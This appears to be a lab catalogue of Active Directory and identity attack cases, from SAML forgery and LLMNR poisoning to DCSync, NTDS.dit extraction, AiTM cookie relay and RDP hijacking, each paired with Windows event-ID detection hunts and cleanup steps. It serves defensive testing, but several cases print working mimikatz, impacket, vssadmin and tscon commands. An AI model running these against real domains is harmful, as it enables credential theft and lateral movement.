C-tokenreplay.name: Bearer token replay — local issuer-only verifier accepts a captured token
C-tokenreplay.setup: local AD/host lab: single-file Flask resource server bound to 127.0.0.1:7001 that validates a JWT by issuer claim only (no audience/binding/expiry enforcement). Operator captures the token from their OWN earlier session. No third-party tokens.
C-tokenreplay.success_criterion: Replayed captured token returns 'ACCESS-GRANTED sub=operator' from a fresh client with no re-authentication — confirms the verifier lacks audience/expiry/sender-binding (seam). Detection analog: correlate same bearer token / session ID across distinct source IPs or impossible-travel in IdP/app logs.
C-tokenreplay.cleanup: Ctrl-C the process; in-memory only, no files written.
C-tokenreplay.safety: Local stub + FAKE HS256 key, 127.0.0.1 only, operator's own token; no real IdP and no third-party credential capture (reference/detection, no-malware design).

C-saml-forge.name: SAML assertion forge — local SP trusting issuer-only accepts self-signed assertion
C-saml-forge.setup: local AD/host lab: a single-file verifier simulating a misconfigured SAML SP that checks only the Issuer string and a signature against a key the operator controls (golden-SAML analog). FAKE lab key only; no real IdP/ADFS.
C-saml-forge.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY. Golden-SAML trust-failure analog: SP validates Issuer + signature but the
# signing key is one the operator can forge in-lab (simulating a stolen ADFS token-signing key).
# No real IdP, no network, FAKE key. Demonstrates issuer-only trust seam.
import hmac, hashlib, xml.etree.ElementTree as ET

LAB_SIGNING_KEY = b'LAB-FAKE-TOKEN-SIGNING-KEY'  # stand-in for compromised ADFS key

def build_assertion(user, issuer='https://lab-adfs/idp'):
    body = '<Assertion><Issuer>%s</Issuer><Subject>%s</Subject></Assertion>' % (issuer, user)
    sig = hmac.new(LAB_SIGNING_KEY, body.encode(), hashlib.sha256).hexdigest()
    return '<Signed><sig>%s</sig>%s</Signed>' % (sig, body)

def sp_verify(signed_xml):
    root = ET.fromstring(signed_xml)
    sig = root.find('sig').text
    inner = signed_xml[signed_xml.index('<Assertion>'):signed_xml.index('</Signed>')]
    exp = hmac.new(LAB_SIGNING_KEY, inner.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(exp, sig):
        return 'SIG-FAIL'
    iss = ET.fromstring(inner).find('Issuer').text
    # SEAM: SP trusts any assertion bearing the expected Issuer + valid signature. No assertion
    # conditions/NotOnOrAfter, no InResponseTo binding -> forged identity accepted.
    if iss == 'https://lab-adfs/idp':
        sub = ET.fromstring(inner).find('Subject').text
        return 'SP-ACCESS-GRANTED user=%s' % sub
    return 'ISS-FAIL'

if __name__ == '__main__':
    forged = build_assertion('Administrator')  # operator forges arbitrary user with lab key
    print('[*] forged assertion for: Administrator')
    print('sp result:', sp_verify(forged))
C-saml-forge.success_criterion: SP returns 'SP-ACCESS-GRANTED user=Administrator' for an assertion the operator minted (never issued by a real IdP) — confirms issuer+signature-only trust with no condition/replay binding. Detection analog: ADFS/Entra sign-in logs showing assertions with no matching real authentication event, or token-signing-key use outside the ADFS service account (Event 4662 on the AD CS/ADFS key, and 1202/1206 ADFS audit anomalies).
C-saml-forge.cleanup: No files/network; process exits immediately. Nothing to revert.
C-saml-forge.safety: Pure local computation, FAKE signing key, no IdP/network/third-party assertions (reference/detection, no-malware design).

C-mitm.name: LLMNR/NBT-NS poisoning sim — local responder in an owned lab segment
C-mitm.setup: local AD/host lab: a loopback simulation of LLMNR name-resolution poisoning. A 'victim' resolver multicasts a name; a rogue responder answers first. Pure localhost sockets, no real LAN multicast, no NTLM relay. (Real-lab analog: Responder.py on an OWNED, isolated lab VLAN.)
C-mitm.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY. Simulates LLMNR/NBT-NS poisoning on loopback to show the trust failure:
# a client trusts the FIRST answer to an unauthenticated name query. No real multicast, no relay,
# no credential capture. Real-lab reference: 'responder -I <lab-iface>' on an OWNED segment.
import socket, threading, time

MCAST = ('127.0.0.1', 55353)  # stand-in for 224.0.0.252:5355 LLMNR

def rogue_responder():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(MCAST)
    while True:
        data, addr = s.recvfrom(1024)
        if data.startswith(b'WHO-HAS '):
            # Attacker answers any query, claiming to be the host (poison)
            s.sendto(b'I-AM 10.0.0.66(ATTACKER)', addr)

def victim_lookup(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('127.0.0.1', 0))
    s.settimeout(2)
    s.sendto(b'WHO-HAS '+name.encode(), MCAST)
    ans,_ = s.recvfrom(1024)
    return ans.decode()

if __name__ == '__main__':
    threading.Thread(target=rogue_responder, daemon=True).start(); time.sleep(1)
    # Victim mistypes/queries a non-existent host -> no authority, accepts first responder
    res = victim_lookup('fileserver01')
    print('[*] victim resolved fileserver01 ->', res)
    if 'ATTACKER' in res:
        print('RESULT: POISONED — unauthenticated name resolution trusts rogue first-answer (seam confirmed)')
C-mitm.success_criterion: Victim resolves 'fileserver01' to the attacker-controlled value and prints 'POISONED' — confirms unauthenticated, authority-free name resolution. Detection in real lab: spike of LLMNR(5355)/NBT-NS(137) responses from a non-DNS host; Sysmon/NDR seeing one host answering many name queries; Windows Event 4648/inbound NTLM to the rogue host.
C-mitm.cleanup: Ctrl-C; loopback sockets close on exit, no persistent state.
C-mitm.safety: Loopback-only simulation, no LAN multicast, no NTLM relay, no credential capture (reference/detection, no-malware design).

C-lateral.name: Lateral movement via reused local-admin hash — owned lab pair (reference + detection)
C-lateral.setup: local AD/host lab: two OWNED Windows lab VMs sharing the same local Administrator password (the misconfiguration). Run from an authorized Kali/admin host with impacket installed. Use FAKE lab creds. Defanged: commands shown, not auto-executed.
C-lateral.script:
#!/usr/bin/env bash
# AUTHORIZED OWNED-LAB ONLY. Demonstrates lateral movement enabled by a SHARED local-admin
# secret (no LAPS). DEFANGED reference: prints the commands; uncomment to run in your owned lab.
set -euo pipefail
LAB_HOST1="10.0.0.21"   # OWNED lab VM
LAB_HOST2="10.0.0.22"   # OWNED lab VM (same local-admin secret = the seam)
LAB_USER='Administrator'
LAB_HASH='aad3b435b51404eeaad3b435b51404ee:FAKEHASHFAKEHASHFAKEHASHFAKEHASH'  # FAKE NTLM hash

echo '[*] PUBLIC TOOL reference (impacket) — pass-the-hash to OWNED second host:'
echo "    impacket-psexec -hashes ${LAB_HASH} ${LAB_USER}@${LAB_HOST2}"
echo "    impacket-wmiexec -hashes ${LAB_HASH} ${LAB_USER}@${LAB_HOST2}"
echo '[*] Validation idea: confirm the SAME hash authenticates on both hosts -> shared secret seam.'
# --- Uncomment in an authorized owned lab only ---
# impacket-wmiexec -hashes "$LAB_HASH" "${LAB_USER}@${LAB_HOST2}" 'hostname'
echo
echo '[*] DETECTION success-criterion (run on the lab DC / endpoints):'
echo '    - Event 4624 LogonType 3 with NTLM (no Kerberos) from HOST1 -> HOST2'
echo '    - Event 4672 (special privileges) for Administrator on remote host'
echo '    - PsExec artifacts: Service install Event 7045 (PSEXESVC), Sysmon EID 1/13'
echo '    - Same local Administrator RID-500 logon across multiple hosts (lateral pattern)'
C-lateral.success_criterion: In the owned lab, the FAKE-placeholder workflow (with real lab creds) authenticates the same hash on both hosts; detection confirms via Event 4624 Type 3 NTLM + 4672 + service-install 7045 on the second host — proving the shared-secret lateral seam.
C-lateral.cleanup: Remove any PSEXESVC service/binary on lab hosts (sc delete PSEXESVC), clear test files, rotate the lab local-admin secret / enable LAPS.
C-lateral.safety: Public-tool reference (impacket) against OWNED lab hosts only, FAKE hash placeholder, commands defanged (commented), paired with Event-ID detection — no malware authored.

CR-dcsync.name: DCSync — replication-rights abuse reference (lab AD) + 4662 detection
CR-dcsync.setup: local AD/host lab: an OWNED test domain with a DC and a principal granted Replicating Directory Changes. Run validation from an authorized admin/attacker lab host. Defanged: PUBLIC TOOL reference commands only, not auto-run.
CR-dcsync.script:
# AUTHORIZED OWNED-LAB AD ONLY. DCSync abuses the DS-Replication-Get-Changes right to pull
# secrets as if a DC. DEFANGED: reference commands + the authoritative DETECTION criterion.
# No malware written; mimikatz/impacket are PUBLIC tools referenced for an owned lab.
Write-Host '[*] PUBLIC TOOL reference (run only in your OWNED lab domain):'
Write-Host '    mimikatz # lsadump::dcsync /domain:lab.local /user:krbtgt'
Write-Host '    impacket-secretsdump -just-dc-user krbtgt lab.local/labadmin@10.0.0.10'
Write-Host ''
Write-Host '[*] Pre-req that IS the seam: a non-DC principal holding replication rights. Audit it:'
Write-Host '    Import-Module ActiveDirectory'
Write-Host '    (Get-Acl "AD:\$((Get-ADDomain).DistinguishedName)").Access |'
Write-Host '      Where-Object { $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" } |'
Write-Host '      Select-Object IdentityReference, ActiveDirectoryRights'
Write-Host '    # GUID 1131f6aa... = DS-Replication-Get-Changes (-All = 1131f6ad...)'
Write-Host ''
Write-Host '[*] DETECTION success-criterion (on the DC, Security log):'
Write-Host '    Event 4662 with Properties containing replication control-access GUIDs:'
Write-Host '      1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (Get-Changes)'
Write-Host '      1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Get-Changes-All)'
Write-Host '    Triggered by an Account Name that is NOT a domain controller machine account = DCSync.'
Write-Host '    Sample hunt:'
Write-Host '      Get-WinEvent -FilterHashtable @{LogName="Security";Id=4662} |'
Write-Host '        Where-Object { $_.Message -match "1131f6a[ad]" -and $_.Message -notmatch "DC\$" }'
CR-dcsync.success_criterion: Detection fires: DC Security Event 4662 referencing the DS-Replication-Get-Changes GUID(s) from a non-DC account confirms the DCSync seam. Validation in lab: secretsdump returns the krbtgt/lab hashes for the granted principal.
CR-dcsync.cleanup: Remove the granted replication ACE from the test principal (dsacls / Remove the extended right), rotate krbtgt twice in lab, clear test artifacts.
CR-dcsync.safety: PUBLIC-tool reference (mimikatz/impacket) for an OWNED lab domain + Event 4662 detection; no malware authored, no secrets exfiltrated.

CR-dcshadow.name: DCShadow — rogue DC registration reference (lab AD) + 4662/4742 detection
CR-dcshadow.setup: local AD/host lab: OWNED test domain; Domain/Enterprise Admin context required to register a temporary rogue DC. Run only in an isolated lab forest. Defanged reference only.
CR-dcshadow.script:
# AUTHORIZED OWNED-LAB AD ONLY. DCShadow registers a transient rogue 'DC' to push directory
# changes via replication, bypassing normal write auditing. DEFANGED reference + detection.
# No malware written; mimikatz is a PUBLIC tool referenced for an owned lab forest.
Write-Host '[*] PUBLIC TOOL reference (OWNED lab forest only, two mimikatz sessions):'
Write-Host '    # session A (SYSTEM): sets the malicious attribute to replicate'
Write-Host '    mimikatz # lsadump::dcshadow /object:CN=labuser,...,DC=lab,DC=local /attribute:primaryGroupID /value:512'
Write-Host '    # session B (Domain Admin): pushes the change'
Write-Host '    mimikatz # lsadump::dcshadow /push'
Write-Host ''
Write-Host '[*] DETECTION success-criterion (on legitimate DCs):'
Write-Host '    - Event 4742 (computer account changed) / 4929 / 5137 (directory object created):'
Write-Host '      transient nTDSDSA object + SPN (GC/E3514235-...) registered then removed.'
Write-Host '    - Event 4662 replication GUIDs (1131f6a[ad]) from a host NOT in Domain Controllers OU.'
Write-Host '    - Configuration partition: an unexpected Server object under Sites that vanishes quickly.'
Write-Host '    Sample hunt:'
Write-Host '      Get-WinEvent -FilterHashtable @{LogName="Security";Id=4742} |'
Write-Host '        Where-Object { $_.Message -match "E3514235-4B06-11D1-AB04-00C04FC2DCD2" }'
Write-Host '      Get-ADObject -SearchBase (Get-ADRootDSE).configurationNamingContext -Filter {objectClass -eq "server"} |'
Write-Host '        Compare against the known DC list.'
CR-dcshadow.success_criterion: Detection fires: appearance/disappearance of an unexpected nTDSDSA Server object in the Configuration partition plus Event 4742/4662 from a non-DC host confirms the DCShadow rogue-replication seam.
CR-dcshadow.cleanup: Verify the transient nTDSDSA/Server object was removed (mimikatz auto-cleans; otherwise remove via ntdsutil metadata cleanup), revert the test attribute, rotate affected creds in lab.
CR-dcshadow.safety: PUBLIC-tool reference for an OWNED isolated lab forest + Event 4662/4742/5137 detection; no malware authored, isolated forest only.

CR-ntds-extract.name: NTDS.dit extraction — vssadmin/ntdsutil reference (lab DC) + shadow-copy detection
CR-ntds-extract.setup: local AD/host lab: an OWNED lab DC where you hold admin. Goal is to demonstrate offline credential store extraction via volume shadow copy. Defanged reference commands only; do not auto-run on production.
CR-ntds-extract.script:
# AUTHORIZED OWNED-LAB DC ONLY. Extracting NTDS.dit (the AD credential store) typically uses a
# Volume Shadow Copy to copy the locked DB + SYSTEM hive. DEFANGED reference + DETECTION criterion.
# No malware written; vssadmin/ntdsutil/esentutl are built-in PUBLIC tools referenced for an owned lab.
Write-Host '[*] PUBLIC TOOL reference (OWNED lab DC only):'
Write-Host '    # Option A: ntdsutil IFM snapshot'
Write-Host '    ntdsutil "ac i ntds" "ifm" "create full C:\lab_ifm" q q'
Write-Host '    # Option B: vssadmin shadow + copy NTDS.dit and the SYSTEM hive'
Write-Host '    vssadmin create shadow /for=C:'
Write-Host '    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\lab_ifm\'
Write-Host '    reg save HKLM\SYSTEM C:\lab_ifm\SYSTEM'
Write-Host '    # Offline parse on attacker lab host:'
Write-Host '    impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL'
Write-Host ''
Write-Host '[*] DETECTION success-criterion (on the lab DC):'
Write-Host '    - Event 8222 / vssadmin shadow creation; System log Volume Shadow Copy Service start.'
Write-Host '    - Event 4688 (process create) for vssadmin.exe / ntdsutil.exe / esentutl.exe by a user.'
Write-Host '    - Event 4663 (object access) on NTDS.dit or GLOBALROOT shadow path; 4656 handle requests.'
Write-Host '    - Sysmon EID 1 (ntdsutil/vssadmin) + EID 11 (NTDS.dit copy to a non-NTDS path).'
Write-Host '    Sample hunt:'
Write-Host '      Get-WinEvent -FilterHashtable @{LogName="Security";Id=4688} |'
Write-Host '        Where-Object { $_.Message -match "vssadmin|ntdsutil|esentutl" }'
CR-ntds-extract.success_criterion: Detection fires: lab DC shows shadow-copy creation (VSS Event 8222 / System log) plus Event 4688 for vssadmin/ntdsutil and 4663 access to NTDS.dit by an interactive account — confirms the offline credential-store extraction seam. Lab validation: secretsdump parses hashes from the copied DB.
CR-ntds-extract.cleanup: Delete shadow copies (vssadmin delete shadows /all on the lab DC), remove C:\lab_ifm and the copied SYSTEM hive, rotate krbtgt twice + reset any exposed lab accounts.
CR-ntds-extract.safety: Built-in PUBLIC-tool reference on an OWNED lab DC + VSS/4688/4663 detection; no malware authored, defanged commands.

CR-password-spray.name: Password spray — local auth-stub with lockout-aware pacing + 4625 burst detection
CR-password-spray.setup: local AD/host lab: a local auth verifier (stub) standing in for the lab IdP/DC, seeded with one deliberately weak account. Lockout-aware: one attempt per account per cycle, paced under the lab lockout threshold. Runs entirely on the operator's host.
CR-password-spray.success_criterion: Stub returns a hit on the weak account (svc_app:Password1) without tripping lockout — confirms the weak-credential seam. Real-lab detection: a burst of Event 4625 (failed logon) for MANY distinct accounts with the SAME source / similar timing, low per-account count (one per spray round), optionally followed by one 4624 success = classic spray signature.
CR-password-spray.cleanup: Process is stateless and in-memory; nothing to revert. In lab: reset svc_app to a strong password and review 4625 alerting.
CR-password-spray.safety: Local in-memory auth stub with FAKE users, lockout-aware pacing, no real directory/IdP touched + 4625 detection criterion (reference/detection, no-malware design).

CR-aitm-evilginx.name: AiTM reverse-proxy stub — relays a stub login and captures the session cookie
CR-aitm-evilginx.setup: local AD/host lab: two local Flask servers on the operator's own host — a stub 'IdP' login (127.0.0.1:8081) and an AiTM reverse proxy (127.0.0.1:8080) that transparently relays to it and harvests the issued session cookie. No real IdP, benign canary cookie, no third-party credentials.
CR-aitm-evilginx.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY (loopback). AiTM/evilginx trust-failure demo: a reverse proxy relays a
# benign STUB login and captures the resulting session cookie (a CANARY value), showing that a
# password-only flow yields a replayable session. No real IdP, no third-party creds, FAKE data.
import threading, time, urllib.request, urllib.parse
from flask import Flask, request, make_response

idp = Flask('idp')
CANARY_COOKIE = 'LAB-CANARY-SESSION-abc123'  # benign marker, not a real token

@idp.route('/login', methods=['POST'])
def idp_login():
    # Stub IdP: any non-empty creds 'succeed' and get a session cookie (no MFA/phish-resistance).
    if request.form.get('user') and request.form.get('pass'):
        r = make_response('IDP-OK')
        r.set_cookie('session', CANARY_COOKIE)
        return r
    return 'IDP-FAIL', 401

proxy = Flask('aitm')
CAPTURED = {}

@proxy.route('/login', methods=['POST'])
def relay():
    # AiTM: forward the victim's submitted creds to the real (stub) IdP, then steal the cookie.
    data = urllib.parse.urlencode({'user':request.form['user'],'pass':request.form['pass']}).encode()
    resp = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:8081/login', data=data))
    setck = resp.headers.get('Set-Cookie','')
    CAPTURED['cookie'] = setck
    return 'PROXIED ok; (operator captured Set-Cookie)'

def serve(app, port):
    app.run(host='127.0.0.1', port=port, use_reloader=False)

if __name__ == '__main__':
    threading.Thread(target=serve, args=(idp,8081), daemon=True).start()
    threading.Thread(target=serve, args=(proxy,8080), daemon=True).start()
    time.sleep(1.5)
    body = urllib.parse.urlencode({'user':'victim','pass':'whatever'}).encode()
    out = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:8080/login', data=body)).read().decode()
    print('[*] victim->proxy:', out)
    print('RESULT: captured session cookie via AiTM relay ->', CAPTURED.get('cookie'))
    print('       Seam: password-only flow yields a bearer session cookie with no proof-of-possession/MFA binding.')
CR-aitm-evilginx.success_criterion: Operator's proxy logs the relayed 'Set-Cookie: session=LAB-CANARY-SESSION-...' — confirms the AiTM seam (a non-phish-resistant flow surrenders a replayable session through a relay). Detection in real env: IdP sign-in from a proxy/hosting ASN, session token used from a new IP/device, MFA satisfied but anomalous client, new OAuth/refresh token issuance.
CR-aitm-evilginx.cleanup: Ctrl-C both servers; everything is in-memory/loopback, no files written.
CR-aitm-evilginx.safety: Loopback stub IdP + benign CANARY cookie only, no real identity provider and no third-party credential capture (local trust-failure stub, no-malware design).

CR-infostealer-cookie.name: Browser cookie theft sim — read operator's OWN cookie store to show no device-binding
CR-infostealer-cookie.setup: local AD/host lab: a throwaway box where the operator first plants a BENIGN canary cookie into their OWN Chromium-style cookies SQLite, then reads it back to show the stored session value is portable (no hardware/device binding). No third-party browsers, no real sites.
CR-infostealer-cookie.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY. Reads the OPERATOR'S OWN cookie store (a throwaway DB we create here) to
# demonstrate the infostealer seam: a stored session cookie is portable with no device binding.
# We plant a BENIGN CANARY ourselves; we never read another user's or a third party's cookies.
import sqlite3, os, tempfile

LAB_DB = os.path.join(tempfile.gettempdir(), 'lab_canary_cookies.sqlite')
CANARY = 'LAB-CANARY-COOKIE-do-not-use-7f3a'

# 1) Operator plants a benign canary into their own throwaway cookie store (mimics a browser DB)
con = sqlite3.connect(LAB_DB)
con.execute('CREATE TABLE IF NOT EXISTS cookies(host_key TEXT, name TEXT, value TEXT)')
con.execute('DELETE FROM cookies')
con.execute("INSERT INTO cookies VALUES ('lab.example','session',?)", (CANARY,))
con.commit(); con.close()

# 2) 'Stealer' simply reads the file at rest -> proves cookie is exfiltratable & replayable off-host
con = sqlite3.connect(LAB_DB)
rows = con.execute('SELECT host_key,name,value FROM cookies').fetchall()
con.close()
print('[*] read operator-own cookie store:', rows)
if any(CANARY in r[2] for r in rows):
    print('RESULT: CANARY recovered at rest with no device/hardware binding -> portable session seam confirmed')
    print('       (Real defense: bound sessions / DPAPI app-bound encryption / token binding would break portability.)')
CR-infostealer-cookie.success_criterion: Script recovers the planted CANARY value from the at-rest store and prints the seam confirmation — shows the session cookie carries no device binding and would replay off-host. Detection analog: EDR file-read access to the browser 'Cookies'/'Login Data' SQLite by a non-browser process; session reused from a new device fingerprint.
CR-infostealer-cookie.cleanup: rm the throwaway DB: os.remove on lab_canary_cookies.sqlite (script writes only this lab file).
CR-infostealer-cookie.safety: Operator reads ONLY their own throwaway, self-planted CANARY DB; no third-party browser, no real cookies, benign value (local trust-failure stub, no-malware design).

CR-keylogging.name: Keystroke-trust sim — local buffer canary on operator's own box (no real capture)
CR-keylogging.setup: local AD/host lab: the operator's own throwaway box. A self-fed in-process buffer simulates how unprotected keystrokes are observable to same-user code; the operator types a BENIGN canary into the script's own stdin. No OS-level hooks, no global keyboard interception, no third-party input.
CR-keylogging.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY. Demonstrates the keylogging TRUST FAILURE without intercepting the OS:
# same-user code can observe input handed to it. The operator types a BENIGN CANARY into THIS
# script's own stdin; we never install a global hook or capture other apps/users.
import sys, time

CANARY = 'LAB-CANARY-KEYSTROKE-9q2'
buf = []
print('[*] Local keystroke-trust demo. Type the canary then press Enter:')
print('    (paste this exactly): %s' % CANARY)
try:
    line = sys.stdin.readline().strip()
except Exception:
    line = CANARY  # non-interactive fallback for CI/demo
for ch in (line or CANARY):
    buf.append(ch); time.sleep(0)  # simulates per-keystroke observation by same-user code
recovered = ''.join(buf)
print('[*] in-process buffer captured:', repr(recovered))
if CANARY in recovered:
    print('RESULT: canary recovered from same-process input buffer -> no input isolation between')
    print('       same-user processes (seam). Defense: secure-desktop/credential UI, protected input paths.')
CR-keylogging.success_criterion: The script echoes the BENIGN canary back from its own input buffer and prints the seam note — illustrates that unprotected input handed to same-user code is observable. Detection analog (real env): EDR alerting on SetWindowsHookEx/global hook install, RawInput registration, or a process reading another's input queue.
CR-keylogging.cleanup: Stateless, in-memory; nothing written, nothing to revert.
CR-keylogging.safety: No OS hook, no global keyboard capture, only THIS process's own stdin with a benign canary the operator types (local trust-failure stub, no-malware design).

CR-cloud-token-cache.name: Cloud token-cache reuse — read operator's OWN CLI creds to show off-host reuse
CR-cloud-token-cache.setup: local AD/host lab: the operator's own box with a lab AWS CLI profile (or a self-created lab token cache). Demonstrates that cached cloud credentials are file-resident and reusable off-host (no device binding). Uses the operator's OWN lab profile only.
CR-cloud-token-cache.script:
#!/usr/bin/env bash
# AUTHORIZED LAB ONLY. Reads the OPERATOR'S OWN cloud CLI credential cache to show the seam:
# cached long-lived keys / SSO tokens are plain files, portable & reusable off the issuing host.
# We create a FAKE lab profile if none exists; we never read another user's account or real keys.
set -euo pipefail
CREDS="$HOME/.aws/credentials"
if [ ! -f "$CREDS" ]; then
  mkdir -p "$HOME/.aws"
  printf '[lab-demo]\naws_access_key_id = AKIAFAKELABKEY000000\naws_secret_access_key = FAKEsecretLABonlyDoNotUse/0000000000000000\n' > "$CREDS"
  echo '[*] created FAKE lab profile (no real keys present).'
fi
echo '[*] cloud credential cache locations (operator-own):'
for f in "$HOME/.aws/credentials" "$HOME/.aws/cli/cache" "$HOME/.aws/sso/cache" "$HOME/.config/gcloud/credentials.db" "$HOME/.azure/msal_token_cache.json"; do
  [ -e "$f" ] && echo "    PRESENT (file-resident, portable): $f"
done
echo '[*] showing that the lab profile is readable plaintext (the seam):'
grep -E 'aws_access_key_id|aws_secret_access_key' "$CREDS" | sed 's/= .*/= <REDACTED-but-present>/'
echo 'RESULT: cached cloud creds are file-resident with no host/device binding -> reusable off-host (seam confirmed).'
echo '[*] DETECTION criterion: CloudTrail shows the access key / SSO token used from a NEW source IP or'
echo '    instance/role outside its origin (GetCallerIdentity / API calls with mismatched UserAgent/SourceIPAddress).'
CR-cloud-token-cache.success_criterion: Script enumerates the file-resident credential caches and prints the readable lab key location — confirms cached cloud creds have no device binding and reuse off-host. Detection: CloudTrail (or Azure/GCP audit) showing the same key/token from a new source IP / unexpected UserAgent.
CR-cloud-token-cache.cleanup: Remove the lab profile block from ~/.aws/credentials (or delete the file if only the lab profile exists); the script created only the FAKE lab-demo entry.
CR-cloud-token-cache.safety: Reads ONLY the operator's own lab credential cache, generates a FAKE key if absent, redacts secrets in output + CloudTrail detection (reference/detection, no-malware design).

CR-rdp-hijack.name: RDP session hijack — tscon reference (owned host) + 4778/4779 detection
CR-rdp-hijack.setup: local AD/host lab: an OWNED lab Windows host with two test interactive sessions. SYSTEM-level tscon can reconnect another user's disconnected session without their password. Defanged reference + detection; run only on an owned lab box.
CR-rdp-hijack.script:
# AUTHORIZED OWNED-LAB HOST ONLY. tscon allows a SYSTEM-context process to attach a disconnected
# RDP/console session to another terminal WITHOUT the user's password. DEFANGED reference + detection.
# No malware written; tscon/query are built-in PUBLIC tools, referenced for an owned lab host.
Write-Host '[*] PUBLIC TOOL reference (OWNED lab host only):'
Write-Host '    query user                       # list sessions + IDs (note a Disc(onnected) session)'
Write-Host '    # As SYSTEM (e.g. via a service), attach target session to the current console:'
Write-Host '    sc create labsess binPath= "cmd /k tscon 2 /dest:console" ; sc start labsess'
Write-Host '    # (session id 2 = the disconnected lab user you want to hijack)'
Write-Host ''
Write-Host '[*] DETECTION success-criterion (lab host Security log):'
Write-Host '    - Event 4778 (session reconnected) / 4779 (session disconnected) with mismatched'
Write-Host '      Account Name vs the session owner = hijack indicator.'
Write-Host '    - Event 4688 for tscon.exe spawned by services.exe/SYSTEM (not the logged-on user).'
Write-Host '    - Event 7045 service install (the helper service used to gain SYSTEM).'
Write-Host '    Sample hunt:'
Write-Host '      Get-WinEvent -FilterHashtable @{LogName="Security";Id=4778,4779} |'
Write-Host '        Select-Object TimeCreated, @{n="msg";e={$_.Message}} | Format-List'
CR-rdp-hijack.success_criterion: On the owned lab host the reference attaches another disconnected session without its password; detection confirms via Event 4778/4779 with an account/session-owner mismatch plus tscon.exe spawned under SYSTEM (4688) — proving the RDP session-hijack seam.
CR-rdp-hijack.cleanup: sc delete labsess; log off the test sessions (logoff <id>); remove any helper service/binary.
CR-rdp-hijack.safety: Built-in PUBLIC-tool (tscon) reference on an OWNED lab host + Event 4778/4779 detection; defanged, no malware authored.

CR-ssh-agent-pivot.name: SSH agent-forwarding pivot — localhost jump-host pair shows agent socket abuse
CR-ssh-agent-pivot.setup: local AD/host lab: a single host acting as both 'client' and 'jump' over loopback. The operator forwards their agent to the jump host; a process on the jump host then reuses the forwarded SSH_AUTH_SOCK to authenticate onward — proving agent forwarding exposes the operator's keys to anyone with the socket. Operator's OWN lab key only.
CR-ssh-agent-pivot.script:
#!/usr/bin/env bash
# AUTHORIZED LAB ONLY (loopback). Demonstrates the SSH agent-forwarding seam: when -A forwards your
# agent to a jump host, ANY process there that can read $SSH_AUTH_SOCK can use your keys onward.
# Uses the operator's OWN throwaway lab key; all loopback. No third-party hosts.
set -euo pipefail
LABDIR=$(mktemp -d)
KEY="$LABDIR/lab_ed25519"
ssh-keygen -t ed25519 -N '' -f "$KEY" -C lab-agent-pivot >/dev/null
# Authorize the lab key for loopback ssh (operator-own ~/.ssh)
mkdir -p "$HOME/.ssh"; touch "$HOME/.ssh/authorized_keys"
grep -qf "$KEY.pub" "$HOME/.ssh/authorized_keys" || cat "$KEY.pub" >> "$HOME/.ssh/authorized_keys"
# Start an isolated agent and load the key (simulates the forwarded agent on a jump host)
eval "$(ssh-agent -s)" >/dev/null
ssh-add "$KEY" 2>/dev/null
echo "[*] forwarded agent socket: $SSH_AUTH_SOCK"
echo '[*] A separate process on the jump host reuses the SAME socket to auth onward:'
SSH_AUTH_SOCK="$SSH_AUTH_SOCK" ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
   -o IdentitiesOnly=no localhost 'echo PIVOT-OK via forwarded agent as $(whoami)@$(hostname)' || \
   echo '[!] (enable sshd on the lab box to complete the live hop)'
echo 'RESULT: any process with access to the forwarded SSH_AUTH_SOCK authenticates as the operator (seam).'
echo '[*] DETECTION: sshd auth.log shows agent-based logins from the jump host; correlate one key used'
echo '    across multiple hops in a short window. Mitigation: drop -A, use ProxyJump, or confirm-on-use (ssh-add -c).'
kill "$SSH_AGENT_PID" 2>/dev/null || true
rm -rf "$LABDIR"
CR-ssh-agent-pivot.success_criterion: A distinct process using the same forwarded SSH_AUTH_SOCK completes an onward ssh to localhost ('PIVOT-OK ...') without holding the private key — confirms agent-forwarding exposes the operator's keys to any local process (seam). Detection: sshd auth.log/Event showing one key authenticating across multiple hops.
CR-ssh-agent-pivot.cleanup: Script kills its ssh-agent and removes the temp keydir; remove the lab key line from ~/.ssh/authorized_keys (sed/grep -v) afterward.
CR-ssh-agent-pivot.safety: Loopback jump-host pair, operator's OWN throwaway lab key, agent killed and temp files removed on exit; no third-party hosts (reference/detection, no-malware design).

CR-dcom-lateral.name: DCOM lateral activation — MMC20/ShellWindows reference (owned host) + 10000-series detection
CR-dcom-lateral.setup: local AD/host lab: an OWNED lab Windows host. DCOM remote activation (e.g. MMC20.Application.ExecuteShellCommand) runs code via the DCOM service. Defanged reference + DCOM-server (10000-series) and 4688 detection; run only against an owned lab target.
CR-dcom-lateral.script:
# AUTHORIZED OWNED-LAB HOST ONLY. DCOM lateral movement activates a remote COM object to run code
# under the activating user's rights. DEFANGED reference + DETECTION. No malware written; this uses
# built-in COM activation (PUBLIC technique) against an OWNED lab host only.
$LabTarget = '10.0.0.30'   # OWNED lab host
Write-Host '[*] PUBLIC technique reference (OWNED lab host only) — DEFANGED (commented):'
Write-Host '    # MMC20.Application method:'
Write-Host "    # \$c = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','$LabTarget'))"
Write-Host '    # $c.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > C:\lab_dcom_proof.txt","7")'
Write-Host '    # (benign proof: write hostname to a file on the lab target; no payload)'
Write-Host ''
Write-Host '[*] DETECTION success-criterion (lab target):'
Write-Host '    - System log DistributedCOM Event 10028/10029/10000-series (DCOM activation / launch).'
Write-Host '    - Security Event 4688: mmc.exe (or the COM host) spawning cmd.exe/powershell.exe.'
Write-Host '    - Event 4624 LogonType 3 from the source lab host immediately before activation.'
